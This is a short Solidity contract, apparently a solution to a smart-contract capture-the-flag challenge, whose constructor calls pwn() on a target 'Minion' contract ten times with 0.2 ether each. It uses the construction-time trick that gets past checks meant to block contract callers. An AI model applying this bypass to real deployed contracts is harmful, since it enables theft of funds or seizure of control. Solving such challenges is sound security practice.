pragma solidity ^0.8.0;
import './MockAccessControl.sol';
contract MinionHacker{
    constructor(address addr) payable{
        for (uint i; i< 10 ; i++){
             Minion(addr).pwn{value: 1 ether/5}();
        }
    }

    receive() payable external{}
}